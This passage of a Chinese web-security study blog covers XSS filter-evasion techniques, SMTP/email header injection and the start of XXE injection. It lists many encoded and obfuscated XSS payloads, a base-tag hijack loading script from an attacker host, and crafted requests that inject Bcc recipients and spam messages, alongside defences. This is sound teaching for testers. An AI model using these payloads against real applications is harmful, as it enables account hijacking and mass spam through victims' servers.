<p>注意，因为已经终止了一个被引用的字符串，为阻止JavaScript解释器出现错误，必须在注入的代码后使用有效的语法确保脚本继续正常执行。在这个示例中，变量foo被声明，另一个引用字符串被打开，它们将被紧随在字符串后面的代码终止。另一种经常有效的方法是使用//结束输入，将剩下的脚本当做注释处理。</p>
<h5 id="例3：包含URL的特性"><a href="#例3：包含URL的特性" class="headerlink" title="例3：包含URL的特性"></a>例3：包含URL的特性</h5><p>假设返回的页面包含以下脚本：</p>
<p><strong>&lt;a href='"myxsstestdmqlwp">Click hear ...&lt;/a></strong></p>
<p>这时，受控制的字符串插入到一个&lt;a>标签的href属性中。在一些浏览器中，这个属性可能包含一个使用javascript:协议的URL，从而可以使用以下脚本直接利用XSS：</p>
<p><strong>javascript:alert(1)</strong></p>
<p>如前所述，因为输入将反射到标签属性中，因此这时还可以注入一个事件处理器。</p>
<p>要向当前所有的浏览器实施攻击，可以同时使用一个无效的图像名称与一个onerror事件处理器：</p>
<p><strong>#“onclick="javascript:alert(1)</strong></p>
<p>对于在前面步骤中记下的每一个潜在的XSS漏洞，采取以下措施。</p>
<ol>
<li>检查HTML源代码，确定受控制的字符串的位置</li>
<li>如果字符串出现在几个位置，应将每个位置当做一个潜在的漏洞，分别进行分析</li>
<li>根据用户控制的字符串在HTML中的位置，确定需要如何对其进行修改以使任意JavaScript得以执行。通常，有大量方法可称为传送攻击的有效工具。</li>
<li>向应用程序提交设计的字符串，测试它是否有用。如果涉及的字符串仍然按原样返回，表示应用程序存在XSS漏洞。使用一段概念验证脚本显示一个警报对话框，重复检查语法是否正确，并确定响应显示时，对话框是否出现在浏览器中。</li>
</ol>
<h4 id="探查防御性反射"><a href="#探查防御性反射" class="headerlink" title="探查防御性反射"></a>探查防御性反射</h4><p>通常情况下最初提交的攻击字符串并不会被服务器按原样返回，因而无法成功执行注入的JavaScript。如果是这样，不要放弃！接下来应该确定服务器对输入进行了哪些处理。主要有以下3中可能的情况。</p>
<ul>
<li>应用程序或者Web应用程序防火墙保护的应用程序发现一个攻击签名，完全阻止了输入。</li>
<li>应用程序已经接受了输入，但对攻击字符串进行了某种净化或编码。</li>
<li>应用程序把攻击字符串截短至某个固定的最大长度。</li>
</ul>
<h4 id="避开基于签名的过滤"><a href="#避开基于签名的过滤" class="headerlink" title="避开基于签名的过滤"></a>避开基于签名的过滤</h4><h5 id="引入脚本代码的方法"><a href="#引入脚本代码的方法" class="headerlink" title="引入脚本代码的方法"></a>引入脚本代码的方法</h5><p>有4中不同的方法可用于在HTML页面中引入脚本代码。</p>
<h5 id="脚本标签"><a href="#脚本标签" class="headerlink" title="脚本标签"></a>脚本标签</h5><p>除直接使用&lt;script>标签外，还可以通过各种方法、使用复杂的语法来隐藏标签，从而避开某些过滤：</p>
<p><strong>&lt;object data="data:text/html,&lt;script>alert(1)&lt;/script>"></strong></p>
<p><strong>&lt;object data="data:text/html;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ=="></strong></p>
<p><strong>&lt;object data="data:text/html;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==">Click here&lt;/a></strong></p>
<p>上述基于Base64的字符串为：</p>
<p><strong>&lt;script>alert(1)&lt;/script></strong></p>
<h6 id="事件处理器"><a href="#事件处理器" class="headerlink" title="事件处理器"></a>事件处理器</h6><p>有大量事件处理器可与各种标签结合使用，以用于执行脚本。以下是一些较为少见的示例，可在不需要任何用户交互的情况下执行脚本：</p>
<p><strong>&lt;xml onreadystatechange=alert(1)></strong></p>
<p><strong>&lt;style onreadystatechange=alert(1)></strong></p>
<p><strong>&lt;iframe onreadystatechange=alert(1)></strong></p>
<p><strong>&lt;object onerror=alert(1)></strong></p>
<p><strong>&lt;object type=image src=valid.gif onreadystatechange=alert(1)>&lt;/object></strong></p>
<p><strong>&lt;img type=image src=valid.gif onreadystatechange=alert(1)></strong></p>
<p><strong>&lt;input type=image src=valid.gif onreadystatechange=alert(1)></strong> </p>
<p><strong>&lt;isindex type=image src=valid.gif onreadychangestate=alert(1)></strong></p>
<p><strong>&lt;script onreadychangestate=alert(1)></strong></p>
<p><strong>&lt;bgsound  onpropertychange=alert(1)></strong></p>
<p><strong>&lt;body onbeforeactivate=alert(1)></strong></p>
<p><strong>&lt;body onactivate=alert(1)></strong></p>
<p><strong>&lt;body onfocusin=alert(1)></strong></p>
<p>HTML5使用事件处理器提供了大量的向量。这包括使用autofocus属性自动触发之前需要用户交互的事件：</p>
<p><strong>&lt;input autofocus onfocus=alert(1)></strong></p>
<p><strong>&lt;input onblur=alert(1) autofocus>&lt;input autofocus></strong></p>
<p><strong>&lt;body onscroll=alert(1)>&lt;br>&lt;br>...&lt;br>&lt;input autofocus></strong></p>
<p>它允许在结束标签中使用事件处理器：</p>
<p><strong>&lt;a onmousemove=alert(1)></strong></p>
<p>最后HTML5还通过事件处理器引入了新标签：</p>
<p><strong>&lt;video src=1 onerror=alert(1)></strong></p>
<p><strong>&lt;audio src=1 onerror=alert(1)></strong></p>
<h6 id="脚本伪协议"><a href="#脚本伪协议" class="headerlink" title="脚本伪协议"></a>脚本伪协议</h6><p>脚本伪协议可用在各种位置，以在需要URL的属性中执行行内脚本。以下是一些示例：</p>
<p><strong>&lt;object data=javascript:alert(1)></strong></p>
<p><strong>&lt;iframe src=javascript:alert(1)></strong></p>
<p><strong>&lt;embed src=javascript:alert(1)></strong></p>
<p>和事件处理器一样，HTML5也提供一些在XSS攻击蔗农使用脚本伪协议的新方法：</p>
<p><strong>&lt;form id=test/>&lt;button form=test formaction=javascript:alert(1)></strong></p>
<p><strong>&lt;event-source src=javascript:alert(1)></strong></p>
<p>在针对输入过滤进行攻击时，新的event-source标签特别有用。与之前任何的HTML5标签不同，它的名字中包含一个连字符，因此，使用这个标签可以避开传统的、认为标签名称只能包含字母的基于正则表达式的过滤。</p>
<h6 id="动态求值的样式"><a href="#动态求值的样式" class="headerlink" title="动态求值的样式"></a>动态求值的样式</h6><p>一些浏览支持在动态求值的CSS样式中使用JavaScript。以下示例可在IE7及其早期版本上执行，如果在兼容模式下运行，还可以再后续版本上执行：</p>
<p><strong>&lt;x style=x:expression(alert(1))</strong></p>
<p>最新版本的IE不再支持上述语法，因为这些语法只能用在XSS攻击中。但是，在最新版的IE中，使用以下请求就可以达到同样的效果：</p>
<p><strong>&lt;x style=behavior:url(#default#time2) onbegin=alert(1)></strong></p>
<h6 id="避开过滤-HTML"><a href="#避开过滤-HTML" class="headerlink" title="避开过滤:HTML"></a>避开过滤:HTML</h6><p>旨在阻止XSS攻击的基于签名的过滤通常采用正则表达式或其他技巧来确定关键的HTML组件，如标签括号、标签名称、属性名称和属性值。例如，过滤器可能会阻止包含使用已知可用于引入脚本的特殊标签或属性名称的HTML输入，或试图阻止以脚本伪协议开头的属性值。通过一种或多种浏览器接受的方式在HTML的关键位置插入不常见的字符，可以避开其中许多过滤。</p>
<p>以下面这段简单的脚本为例：</p>
<p><strong>&lt;img onerror=alert(1) src=a></strong></p>
<p>可以通过各种方式修改这段脚本，并使它至少可以在一个浏览器中运行。</p>
<h6 id="标签名称"><a href="#标签名称" class="headerlink" title="标签名称"></a>标签名称</h6><p>从起始标签名称开始，只需改变所使用字符的大小写，即可避开最简单的过滤：</p>
<p><strong>&lt;iMg onerror=alert(1) src=a></strong></p>
<p>更进一步，可以在任何位置插入NULL字节：</p>
<p><strong>&lt;[%00]img onerror=alert(1) src=a></strong></p>
<p><strong>&lt;i[%00]mg onerror=alert(1) src=a></strong></p>
<p>再进一步，如果对上面的标签名称稍作修改，就可以使用任意标签名称引入事件处理器，从而避开仅仅阻止特定标签名称的过滤：</p>
<p><strong>&lt;x onclick=alert(1) src=a>Click here&lt;/x></strong></p>
<p>有时，可以引入不同名称的新标签，但却找不到使用这些标签直接执行代码的方法。在这些情况下，可以使用一种称为“基本标签劫持”的技巧来实施攻击。&lt;base>标签用于指定一个URL，浏览器应使用该URL解析随后在页面中出现的任何相对URL。如果可以引入一个新&lt;base>，并且页面执行反射点后的任何使用相对URL的&lt;script>，则就可以指定一个指向受你控制的服务器的基本URL。当浏览器加载在HTML页面的剩余指定部分的脚本时，这些脚本将从指定的服务器加载，但仍然能够在调用它们的页面中执行。例如：</p>
<p><strong>&lt;base href="<a href="http://mdattacker.net/badscript.js/&quot;&gt;" target="_blank" rel="noopener">http://mdattacker.net/badscript.js/&quot;&gt;</a></strong></p>
<p>...</p>
<p><strong>&lt;script src="goodscript.js">&lt;/script></strong></p>
<p>根据规范，&lt;base>标签应出现在HTML页面的&lt;head>部分。但是，一些浏览器，如Firefox，运行其出现在页面的任何位置，这显著扩大了这种攻击范围。</p>
<h6 id="标签名称的空格"><a href="#标签名称的空格" class="headerlink" title="标签名称的空格"></a>标签名称的空格</h6><p>一些字符可用于替代标签名称与第一个属性名称之间的空格：</p>
<p><strong>&lt;img/onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img[%09]onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img[%0d]onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img[%0a]onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img/"onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img/'onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img/anyjunk/onerror=alert(1) src=1></strong></p>
<p>需要注意的是，即使在实施攻击时不需要任何标签属性，仍然应始终在标签名称后面添加一些多余的内容，因为这样做可以避开一些简单的过滤：</p>
<p><strong>&lt;script/anyjunk>alert(1)&lt;script></strong></p>
<h6 id="属性名称"><a href="#属性名称" class="headerlink" title="属性名称"></a>属性名称</h6><p>也可以在属性名称中使用上述NULL技巧。这样做可以避开许多视图通过阻止以on开头的属性名称来阻止时间过滤器的简单过滤：</p>
<p><strong>&lt;img o[%00]nerror=alert(1) src=1></strong></p>
<h6 id="属性分隔符"><a href="#属性分隔符" class="headerlink" title="属性分隔符"></a>属性分隔符</h6><p>在最初的示例中，属性值之间并未分割开来，因而需要在属性值后面插入一些空格，表示属性值已结束，以便于添加其他属性。属性可以选择使用双引号或单引号进行分割，或在IE上使用重音符分隔：</p>
<p><strong>&lt;img onerror="alert(1)"src=a></strong></p>
<p><strong>&lt;img onerror=‘alert(1)’src=a></strong></p>
<p><strong>&lt;img onerror=<code>alert(1)</code>src=a></strong></p>
<p>前面的示例提供了另一种方法，可用于避开一些检查以ON开头的属性名称的过滤器。如果过滤器不知道重音符被用作属性分隔符，它会将下面的示例视为仅包含一个属性，其名称不再为事件处理器的名称：</p>
<p><strong>&lt;img src=`a`onerror=alert(1)></strong></p>
<p>通过使用引号分隔的属性，并在标签名称后插入异常字符，就可以设计出不需要使用任何空格的攻击，从而避开一些简单的过滤:</p>
<p><strong>&lt;/onerror="alert(1)"src=a></strong></p>
<h6 id="属性值"><a href="#属性值" class="headerlink" title="属性值"></a>属性值</h6><p>在属性值中，可以使用NULL字节技巧。还可以使用HTML编码的字符，如下所示：</p>
<p><strong>&lt;img onerror=a[%00]lert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x6c;lert(1) src=a></strong></p>
<p>在进一步处理属性值之前，浏览器会对其进行HTML编码，因此，可以使用HTML编码对脚本代码进行模糊处理，从而避开任何过滤。例如，以下攻击避开了许多试图阻止JavaScript为协议处理器的过滤：</p>
<p><strong>&lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29; ></strong></p>
<p>在使用HTML编码时，值得注意的是，浏览器接受规范的各种辩题，甚至可能忽略过滤器“意识到”的HTML编码问题，可以使用十进制和十六进制格式，添加多余的前导零，并省略结尾的分号。以下示例至少可以用在一种浏览器中：</p>
<p><strong>&lt;img onerror=a&amp;#x06c;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x006c;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x0006c;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x108;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#0108;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x108ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x0108ert(1) src=a></strong></p>
<h6 id="标签括号"><a href="#标签括号" class="headerlink" title="标签括号"></a>标签括号</h6><p>有些时候，通过利用奇怪的应用程序或浏览器行为，甚至可以使用无效的标签括号，并且仍然使浏览器按攻击所需的方式处理相关标签。</p>
<p>一些应用程序在应用输入过滤后还执行不必要的URL解码，因此，请求中的以下输入：</p>
<p><strong>%253cimg%20onerror=alert(1)%20src=a%253e</strong></p>
<p>被应用程序服务器进行URL解码，然后将以下输入传递给应用程序：</p>
<p><strong>%3cimg onerror=alert(1) src=a%3e</strong></p>
<p>其中并不包含任何标签括号，因此并不会被输入过滤阻止。但是引用程序随后会执行第二次URL解码，因此输入将变为：</p>
<p><strong>&lt;img onerror=alert(1) src=a></strong></p>
<p>该输入会回显给用户，导致攻击得以实施。</p>
<p>如果应用程序框架基于字形和发音的相似性，将不常见的Unicode字符“转换“为它们最接近的ASCII字符，这时可能会出现与上述示例类似的情况。例如，以下输入使用Unicode双角引号（%u00AB和%u00BB），而不是标签括号：</p>
<p><strong>《img onerror=alert(1) src=a》</strong></p>
<p>应用程序的输入可能会允许该输入，因为其中斌不包含任何有问题的HTML。但是，如果应用程序框架在输入被插到响应中时将引号转化为标签字符，攻击将取得成功。实施证明，由于开发这段额输入，大量应用程序都易于受到这种攻击。</p>
<p>一些输入过滤通过简单地匹配起始和结束尖括号，提取内容，并将其与标签名称黑名单进行比较来识别HTML标签。在这种情况下，可以通过使用多余的括号来避开过滤：</p>
<p><strong>&lt;&lt;script> alert(1);//&lt;&lt;/script></strong></p>
<p>某些情况下，可以利用浏览器的HTML解析器的异常行为来实施攻击，从而避开应用程序的输入过滤。例如，以下HTML使用了ECMAScript for XML（E4X），其中并不包含有效的起始脚本标签，但仍然可以在当前版本的Firefox中执行包含的脚本：</p>
<p><strong>&lt;script&lt;{alert(1)}/>&lt;/script></strong></p>
<h5 id="避开过滤：脚本代码"><a href="#避开过滤：脚本代码" class="headerlink" title="避开过滤：脚本代码"></a>避开过滤：脚本代码</h5><p>某些情况下，可以找到办法来操纵反射型输入，从而在应用程序的响应中插入脚本。但是，可能会遇到其他各种障碍，无法执行实施有效攻击所需的代码。这时，遇到的过滤通常会试图阻止使用某些JavaScript关键字和其他表达式。它们还可能阻止有用的字符，如引号、括号和圆点。</p>
<p>和使用HTML对攻击进行模糊处理一样，也可以通过使用各种技巧来修改所需大的脚本代码</p>
<h6 id="使用JavaScript转义"><a href="#使用JavaScript转义" class="headerlink" title="使用JavaScript转义"></a>使用JavaScript转义</h6><p>JavaScript允许各种字符转义，可以通过这种方式避免包含原义格式的表达式。Unicode转义可用于表示JavaScript关键字中的字符，从而避开许多类型的过滤：</p>
<p><strong>&lt;script>a\u006cert(1);&lt;/script></strong></p>
<p>如果能够使用eval命令，就可以将其他命令以字符串格式传送给eval命令，从而执行这些命令。这样就可以利用各种字符串操纵技巧来隐藏执行的命令。</p>
<p>在JavaScript中，可以使用Unicode转义、十六进制转义和八进制转义：</p>
<p><strong>&lt;script>eval('a\u600cert(1)');&lt;script></strong></p>
<p><strong>&lt;script>eval('a\x6cert(1)');&lt;script></strong></p>
<p><strong>&lt;script>eval('a\154ert(1)');&lt;script></strong></p>
<p>此外， 字符串中的多余转义字符将被忽略：</p>
<p><strong>&lt;script>eval('a\l\ert\(1\)');&lt;script></strong></p>
<h6 id="动态构建字符串"><a href="#动态构建字符串" class="headerlink" title="动态构建字符串"></a>动态构建字符串</h6><p>可以使用其他技巧来动态构建在攻击中使用的字符串：</p>
<p><strong>&lt;script>eval('al' + 'ert(1)');&lt;/script></strong></p>
<p><strong>&lt;script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));&lt;/script></strong></p>
<p><strong>&lt;script>eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));&lt;/script></strong></p>
<h6 id="替代eval的方法"><a href="#替代eval的方法" class="headerlink" title="替代eval的方法"></a>替代eval的方法</h6><p>如果无直接调用eval命令，可以通过其他方法以字符串格式执行命令：</p>
<p><strong>&lt;script>'alert(1)'.replace(/. + /,eval)&lt;/script></strong></p>
<p><strong>&lt;script>function::['alert'](1)&lt;/script></strong></p>
<h6 id="替代圆点"><a href="#替代圆点" class="headerlink" title="替代圆点"></a>替代圆点</h6><p>如果圆点被阻止，可以使用以下方法解引用：</p>
<p><strong>&lt;script>alert(document['cookie'])&lt;/script></strong></p>
<p><strong>&lt;script>with(document)alert(cookie)&lt;/script></strong></p>
<h3 id="查找并利用保存型XSS漏洞"><a href="#查找并利用保存型XSS漏洞" class="headerlink" title="查找并利用保存型XSS漏洞"></a>查找并利用保存型XSS漏洞</h3><h4 id="在Web邮件应用程序中测试XSS"><a href="#在Web邮件应用程序中测试XSS" class="headerlink" title="在Web邮件应用程序中测试XSS"></a>在Web邮件应用程序中测试XSS</h4><h4 id="在上传文件中测试XSS"><a href="#在上传文件中测试XSS" class="headerlink" title="在上传文件中测试XSS"></a>在上传文件中测试XSS</h4><h4 id="混合文件攻击"><a href="#混合文件攻击" class="headerlink" title="混合文件攻击"></a>混合文件攻击</h4><h4 id="在通过Ajax上传的文件中测试XSS"><a href="#在通过Ajax上传的文件中测试XSS" class="headerlink" title="在通过Ajax上传的文件中测试XSS"></a>在通过Ajax上传的文件中测试XSS</h4><h3 id="查找并利用基于DOM的XSS漏洞"><a href="#查找并利用基于DOM的XSS漏洞" class="headerlink" title="查找并利用基于DOM的XSS漏洞"></a>查找并利用基于DOM的XSS漏洞</h3><h2 id="防止XSS攻击"><a href="#防止XSS攻击" class="headerlink" title="防止XSS攻击"></a>防止XSS攻击</h2><h3 id="防止反射型与保存型XSS漏洞"><a href="#防止反射型与保存型XSS漏洞" class="headerlink" title="防止反射型与保存型XSS漏洞"></a>防止反射型与保存型XSS漏洞</h3><h4 id="确认输入"><a href="#确认输入" class="headerlink" title="确认输入"></a>确认输入</h4><h4 id="确认输出"><a href="#确认输出" class="headerlink" title="确认输出"></a>确认输出</h4><h4 id="消除危险的插入点"><a href="#消除危险的插入点" class="headerlink" title="消除危险的插入点"></a>消除危险的插入点</h4><h4 id="允许有限的HTML"><a href="#允许有限的HTML" class="headerlink" title="允许有限的HTML"></a>允许有限的HTML</h4><h3 id="防止基于DOM的XSS漏洞"><a href="#防止基于DOM的XSS漏洞" class="headerlink" title="防止基于DOM的XSS漏洞"></a>防止基于DOM的XSS漏洞</h3><h4 id="确认输入-1"><a href="#确认输入-1" class="headerlink" title="确认输入"></a>确认输入</h4><h4 id="确认输出-1"><a href="#确认输出-1" class="headerlink" title="确认输出"></a>确认输出</h4></script></p></li></ul>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>XSS攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>注入电子邮件</title>
    <url>/2019/04/01/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-5-%E6%B3%A8%E5%85%A5email/</url>
    <content><![CDATA[<h1 id="注入电子邮件"><a href="#注入电子邮件" class="headerlink" title="注入电子邮件"></a>注入电子邮件</h1><p>许多应用程序拥有一项允许用户通过应用程序提交消息的功能。例如，向支持人员报告问题或提供关于Web点反馈。这项功能一般通过邮件（或SMTP）服务器执行。通常，用户提交的输入被插入到邮件服务器处理的SMTP会话中。如果攻击者能够提交未被过滤或净化的专门设计的输入，就可以在这个会话中注入任意SMTP命令。</p>
<p>多数时候，应用程序允许用户指定消息的内容和自己的电子邮件地址（插入到生成电子邮件的From字段），还可以指定消息的主题和其他细节。能够控制的任何字段都易于受到SMTP注入。</p>
<p>SMTP注入漏洞经常被垃圾邮件发送者利用，他们扫描因特网查找易受攻击的邮件表单，并使用它们生成大量垃圾邮件。</p>
<h2 id="操纵电子邮件标头"><a href="#操纵电子邮件标头" class="headerlink" title="操纵电子邮件标头"></a>操纵电子邮件标头</h2><p>假设有下面的邮件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">To: admin@wahh-app.com</span><br><span class="line">From: marcus@wahh-main.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">Confirm Order page doesn<span class="string">'t load</span></span><br></pre></td></tr></table></figure>

<p>PHP <strong>mail()</strong>命令使用additional_headers参数为消息设定发件人地址。这个参数还可用于指定其他标头，包括Cc和Bcc，并用换行符分割每个被请求的标头。因此攻击者可以通过在From字段中注入这其中的某个标头，将邮件发送给任意收件人。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">To: admin@wahh-app.com%<span class="number">0</span>ABC从：all@wahh-othercompany.com</span><br><span class="line">From: marcus@wahh-main.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">Confirm Order page doesn<span class="string">'t load</span></span><br></pre></td></tr></table></figure>

<p>这会导致<strong>mail()</strong>命令生成以下邮件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">To: admin@wahh-app.com</span><br><span class="line">From: marcus@wahh-main.com</span><br><span class="line">Bcc: all@wahh-othercompany.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">Confirm Order page doesn<span class="string">'t load</span></span><br></pre></td></tr></table></figure>

<h2 id="SMTP命令注入"><a href="#SMTP命令注入" class="headerlink" title="SMTP命令注入"></a>SMTP命令注入</h2><p>在其他情况下，应用程序可能会执行SMTP会话，或将用户提交的输入传送一个以不同的组件以完成这一任务。这时，我们就可以直接在这个会话中注入任意SMTP命令，完全控制由应用程序生成的消息。</p>
<p>例如，以一个使用以下请求提交站点反馈的应用程序为例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST feedback.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: wahh-app.com</span><br><span class="line">Content-Length: <span class="number">56</span></span><br><span class="line"></span><br><span class="line">From=daf@wahh-mail.com&amp;Subject=Site+feedback&amp;Message=foo</span><br></pre></td></tr></table></figure>

<p>应用程序会使用以下命令开始一个SMTP会话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MAIL FROM： daf@wahh-mail.com</span><br><span class="line">RCPT TO: feedback@wahh-app.com</span><br><span class="line">DATA</span><br><span class="line">From: daf@wahh-mail.com</span><br><span class="line">To: feedback@wahh-app.com</span><br><span class="line">Subject: Site feedback</span><br><span class="line">foo</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>SMTP 客户端发出DATA命令后，应用程序送出电子邮件消息的内容，包括消息头和主体，然后发送一个点字符（.）。这告诉服务器消息已发送完毕，客户端可以发出其他SMTP命令，发送其他消息。</p>
<p>这时，攻击者可以在任何受控的电子邮件字段中注入任意SMTP命令。例如，他可以尝试注入Subject字段，如下所示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST feedback.php HTTP/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">Host: wahh-app.com</span><br><span class="line"></span><br><span class="line">Content-Length: <span class="number">266</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">From=daf@waff-mail.com&amp;Subject=Site+feedback%<span class="number">0</span>d%<span class="number">0</span>afoo%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">2</span>e%<span class="number">0</span>d%<span class="number">0</span>aMAIL+FROM:+mail@wahh-viagra.com%<span class="number">0</span>d%<span class="number">0</span>aRCPT+TO:+john@wahh-mail.com%<span class="number">0</span>d%<span class="number">0</span>aData%<span class="number">0</span>d%<span class="number">0</span>aFROM:+main@wahh-viagra.com%<span class="number">0</span>d%<span class="number">0</span>aTo:+jhon@wahh-mail.com%<span class="number">0</span>d%<span class="number">0</span>aSubject:+Cheap+VaAGR4%<span class="number">0</span>d%<span class="number">0</span>aBlah%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">2</span>e%<span class="number">0</span>d%<span class="number">0</span>a&amp;Message=Foo</span><br></pre></td></tr></table></figure>

<p>如果应用程序易受攻击，那么建立以下SMTP会话，它生成两个的电子邮件消息，其中第二个完全由攻击者控制：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MAIL FROM: daf@wahh-mail.com</span><br><span class="line">RCPT TO: feedback@wahh-app.com</span><br><span class="line">DATA</span><br><span class="line">From: daf@wahh-mail.com</span><br><span class="line">To: feedback@wahh-app.com</span><br><span class="line">Subject: Site+feedback</span><br><span class="line">foo</span><br><span class="line">.</span><br><span class="line">MAIL FROM: mail@wahh-viagra.com</span><br><span class="line">RCPT TO: john@wahh-mail.com</span><br><span class="line">DATA</span><br><span class="line">From: mail@wahh-viagra.com</span><br><span class="line">To: john@wahh-mail.com</span><br><span class="line">Subject: Cheap V1AGR4</span><br><span class="line">Blah</span><br><span class="line">.</span><br><span class="line">foo</span><br></pre></td></tr></table></figure>

<h2 id="查找SMTP注入漏洞"><a href="#查找SMTP注入漏洞" class="headerlink" title="查找SMTP注入漏洞"></a>查找SMTP注入漏洞</h2><p>为了有效探查应用程序的邮件功能，需要测试每一个提交给电子邮件有关的功能的参数，甚至哪些最初可能与生成的消息无关的参数。</p>
<p>应当测试每一种攻击，并在每个测试中使用Windows和UNIX形式的换行符。</p>
<ol>
<li>应当发轮流提交西面的每个测试字符串作为每一个参数，在相关位置插入电子邮件地址。</li>
<li>留意应用程序返回的任何错误消息。如果这些错误与电子邮件功能中的任何问题有关，确定是否需要对输入进行调整，以利用漏洞。</li>
<li>应用程序的响应可能并不会以任何形式表示一个漏洞存在或被成功利用。应该监控指定的电子邮件地址，看是否收到任何电子邮件。</li>
<li>仔细检查生成相关请求的HTML表单。它们可能提供与服务器端使用的软件有关的线索。其中可能包含一个用于指定电子邮件收件人地址的隐藏或禁用字段，可以直接对其进行修改。</li>
</ol>
<h2 id="防止SMTP注入"><a href="#防止SMTP注入" class="headerlink" title="防止SMTP注入"></a>防止SMTP注入</h2><p>如果对提交电子邮件功能或SMTP会话使用的任何用户提交的数据进行严格的确认检查，就可以防止SMTP注入漏洞。因此，应根据其用途对每项数据进行尽可能严格的确认。</p>
<ul>
<li>应根据一个适当的正则表达式检查电子邮件地址（当然应拒绝所有换行符）</li>
<li>消息主体不得包含任何换行符，并应实施适当的长度限制</li>
<li>如果消息内容被一个SMTP会话直接使用，那么应禁止使用仅包含一个.字符的消息行。</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>电子邮件</tag>
      </tags>
  </entry>
  <entry>
    <title>注入XML解释器</title>
    <url>/2019/03/29/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-3-%E6%B3%A8%E5%85%A5XML%E8%A7%A3%E9%87%8A%E5%99%A8/</url>
    <content><![CDATA[<h1 id="注入XML解释器"><a href="#注入XML解释器" class="headerlink" title="注入XML解释器"></a>注入XML解释器</h1><p>今天的Web应用程序大量使用XML，在浏览器与前端应用程序服务器之间传送的请求和响应，以及在后端应用程序组件（如SOAP服务）之间传送的消息中都可以找到XML。如果使用专门设计的输入破坏应用程序的运行并执行某些未授权的操作，这些位置就易于受到各种攻击。</p>
<h2 id="注入XML外部实体"><a href="#注入XML外部实体" class="headerlink" title="注入XML外部实体"></a>注入XML外部实体</h2><p>在今天的Web应用程序中，XML常用于从客户端向服务器提交数据。然后，服务器端应用程序将处理这些数据，并且可能会返回一个包含XML或任何其他格式数据的响应。在使用异步请求在后台进行通行的基于Ajax的应用程序中，这种行为最为常见。浏览器扩展组件和其他客户端技术也可能会用到XML。</p>
<p>以一个使用Ajax实现的、提供无缝用户体验的搜索功能为例。在用户输入搜索词时，客户端脚本将向服务器提出以下请求：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /search/128/AjaxSearch.ashx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Legth: 44</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchTerm</span>&gt;</span>nothing will change<span class="tag">&lt;/<span class="name">SearchTerm</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务器的响应如下所示（无论响应采用什么格式，其中都可能存在漏洞）：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 81</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchResult</span>&gt;</span>No results found for expression: nothing will change<span class="tag">&lt;/<span class="name">SearchResult</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>客户端脚本将响应该处理，并用搜索结果对用户界面进行更新。</p>
<p>如果遇到这类类型的功能，应当始终检查其是存在XML外部实体（XXE）注入漏洞。之所以会出现这种漏洞，是因为标准的XML解析库支持使用实体引用。这些引用仅仅是在XML文档内部或外部引用数据的一种方法。</p>
<p>XML格式允许在XML文档中定义定制实体。这些实体在文档的开始部分的可选DOCTYPE元素中定义，例如：</p>
